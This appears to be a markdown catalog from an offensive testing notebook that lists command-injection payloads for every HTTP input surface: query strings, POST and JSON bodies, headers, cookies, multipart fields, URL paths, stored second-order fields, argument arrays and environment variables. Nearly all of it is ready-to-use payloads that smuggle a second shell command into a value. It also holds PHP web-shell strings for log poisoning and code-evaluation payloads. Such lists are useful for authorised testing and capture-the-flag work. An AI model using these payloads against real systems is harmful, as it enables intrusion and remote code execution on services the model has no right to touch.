# Injection Vectors — the field-by-field catalog

## Query strings — `?x=y`

```
?host=x;id
?host=x|id
?host=x`id`
?host=x$(id)
?host=x%0aid
?host=x%26id          — & encoded
?host=x%26%26id       — && encoded
?host=x%7Cid          — | encoded
?host=x%3Bid          — ; encoded
?host=x%60id%60       — ` encoded
?host=x%24(id)        — $( encoded
?host[]=x;id          — array
?host[]=x&host[]=id   — array-pair
?host=x;id&x=y        — extra param — pollution
?host=x;id;           — trailing ;
?host=x%23id          — # — comment-eats-rest
?host=x%3f            — ? encoded
?host=%3Bx            — starts with ;
?host=;id             — starts with ;
?host=|id             — starts with |
?host=||id            — starts with ||
?host=&&id            — starts with &&
?host=%0aid%0a        — wrapped in newlines
```

## POST bodies — `host=x&y=z`

```
host=x;id
host=x%3bid
host=x&id             — SPLITS — host=x, then id — not what you want
host=x%26id           — & inside value
host=x%26%26id
host=x%0aid
host=x%7Cid
host=x%60id%60
host=x%24(id)
host=x%23             — # — eats rest-of-body? no — body isn't line-terminated
host=x%0d%0aid
host[]="x;id"
host=;id
host=|id
host=||id
host=&&id
```

## JSON bodies — `{"x":"y"}`

```json
{"host":"x;id"}
{"host":"x|id"}
{"host":"x`id`"}
{"host":"x$(id)"}
{"host":"x\nid"}
{"host":"x\tid"}
{"host":"x\rid"}
{"host":"x;id"}
{"host":"x;id","extra":"y"}
{"host":"x;id","op":"ping"}
{"cmd":"ping","args":["x;id"]}
{"cmd":"ping","args":["-c","4","x;id"]}
{"host":{"$x":"y"}}        — nosqli-shape — different class
{"host":"127.0.0.1;id"}
{"host":"127.0.0.1|id"}
{"host":"127.0.0.1`id`"}
{"host":"127.0.0.1$(id)"}
{"host":"127.0.0.1\nid"}
{"host":";id"}
{"host":"|id"}
{"host":"||id"}
{"host":"&&id"}
{"host":"x'or'a"}
{"host":"x\"or\"a"}
{"expr":"7*7"}             — evaluator fingerprint
{"expr":"system('id')"}
{"expr":"__import__('os').system('id')"}
{"expr":"require('child_process').execSync('id')"}
{"f":"x.png;id"}           — filename-injection
{"url":"http://x;id"}      — url-arg
{"path":"/flag"}           — path-arg
{"name":"x;id"}            — second-order-stored
{"comment":"x;id"}
{"desc":"x;id"}
{"title":"x;id"}
{"email":"x;id@x.com"}
{"user":"x;id"}
{"key":"x;id"}
{"token":"x;id"}
{"search":"x;id"}
{"q":"x;id"}
{"s":"x;id"}
{"query":"x;id"}
{"filter":"x;id"}
{"sort":"x;id"}
{"order":"x;id"}
{"col":"x;id"}
{"field":"x;id"}
{"type":"x;id"}
{"format":"x;id"}
{"mode":"x;id"}
{"action":"x;id"}
{"op":"x;id"}
{"method":"x;id"}
{"callback":"x;id"}        — jsonp-shape — web-xss not cmdi
{"domain":"x;id"}
{"server":"x;id"}
{"node":"x;id"}
{"target":"x;id"}
{"address":"x;id"}
{"ip":"x;id"}
{"hostname":"x;id"}
{"host":"x;id"}
{"addr":"x;id"}
```

## Headers — `Header: value`

```
User-Agent: x;id
User-Agent: <?php system($_GET[0]);?>    — log-poison
Referer: x;id
Referer: <?php system($_GET[0]);?>
X-Forwarded-For: x;id
X-Real-IP: x;id
X-Client-IP: x;id
X-Originating-IP: x;id
Client-IP: x;id
CF-Connecting-IP: x;id
True-Client-IP: x;id
X-Forwarded-Host: x;id
X-Host: x;id
X-Custom-*: x;id
X-Api-Version: x;id
Accept: x;id
Accept-Language: x;id
Accept-Encoding: x;id
Content-Type: x;id                       — rare — parses boundary
Content-Length: x;id                     — request-smuggling not cmdi
X-HTTP-Method-Override: x;id
X-Original-URL: x;id
X-Rewrite-URL: x;id
Authorization: Bearer x;id
Authorization: Basic x;id
Cookie: x=y;id                           — cookie-separator confusion
Cookie: h=x;id
X-Forwarded-Server: x;id
X-Forwarded-Proto: x;id
X-Url-Scheme: x;id
X-Forwarded-Scheme: x;id
X-Real-Url: x;id
X-Original-Host: x;id
```

## Cookies — `Cookie: name=value`

```
Cookie: host=x;id                       — ; is the cookie-sep — splits
Cookie: host=x%3Bid                     — encoded ;
Cookie: host=x%26id                     — encoded &
Cookie: "host=x;id"                     — quoted
Cookie: host="x;id"
Cookie: x;id                            — nameless — some parsers eat it
Cookie: host=x&id                       — & splits cookies
Cookie: host=x%0aid
Cookie: host=x%7Cid
Cookie: host=x%60id%60
Cookie: host=x%24(id)
```

## Multipart — `Content-Disposition`

```
------boundary
Content-Disposition: form-data; name="host"

x;id
------boundary
Content-Disposition: form-data; name="host"; filename="x.png;id"
Content-Type: image/png

[content]
------boundary
Content-Disposition: form-data; name="f"; filename="x.png%3bid"
```

The `filename=` attr is a separate injection surface — `filename-injection.md`.

## Path segments — `/path/x;id/segment`

```
/ping/x;id
/ping/x%3bid
/ping/x|id
/ping/x%7Cid
/ping/x`id`
/ping/x%60id%60
/ping/x%24(id)
/ping/x%0aid
/ping/x%0d%0aid
/x;id/ping                          — ; mid-path
/ping/x;id/check
/ping/;id
/ping/|id
/ping/x;id;                          — trailing ;
/ping/x..;id
/ping/x%2e%2e%3bid                   — encoded traversal+sep
/ping/x;id?host=y                    — mixed path+query
/ping/x%3bid?host=y%3bid             — both
```

## Fragment/anchor — `#x` never reaches the server

`#x;id` — fragments are client-side — never sent — dead surface. But
`%23`/`%2523` inside a value — the encoded form — reaches.

## The second-order surfaces — stored then exec'd

- `POST /register` `name=x;id` → stored → admin-panel `system("notify $name")`
- `POST /comment` `body=x;id` → stored → cron `system("mail $body")`
- `POST /job` `cmd=x;id` → queue → worker `system($cmd)`
- `PUT /config` `{"backup":"x;id"}` → backup-script `system("tar $backup")`
- `POST /webhook` `{"url":"x;id"}` → notifier `system("curl $url")`
- `POST /upload` `filename="x.png;id"` → `convert "$f"` — filename
- `POST /settings` `{"path":"x;id"}` → `system("cat $path")`
- `PATCH /user` `{"bio":"x;id"}` → `system("mail $bio")`

## The `args[]`-array surface — each element if shelled

```
{"cmd":"ping","args":["x;id"]}             — one arg
{"cmd":"ping","args":["-c","4","x;id"]}    — arg-array
{"cmd":"x;id","args":[]}                   — cmd itself
{"cmd":"sh","args":["-c","x;id"]}          — explicit sh
{"cmd":["x;id"]}                           — cmd-array
{"args":"x;id"}                            — args-as-string — concat'd
{"args":"x;id|id"}                         — args-string
```

## The `filename`/upload/`convert`-arg surface — `filename-injection.md`

- the file's NAME is the arg — `x.png;id`
- the file's PATH is the arg — `../../x`/`/tmp/x`
- the CONTENT is the surface — `imagemagick-deep.md`

## The `env`-var / `$_SERVER`-var surfaces — `env-var-injection.md`

```
?x=BASH_ENV;/tmp/x  — if the app passes env-vars to the child
?x=LD_PRELOAD;/tmp/x.so
?x=PATH;/tmp
?x=IFS;,
```

## Falsifiers

- the input never reaches ANY of these surfaces — white-box or exhaustive
  probing confirms — dead

## Output to record

- which vector carried the payload + the verbatim evidence
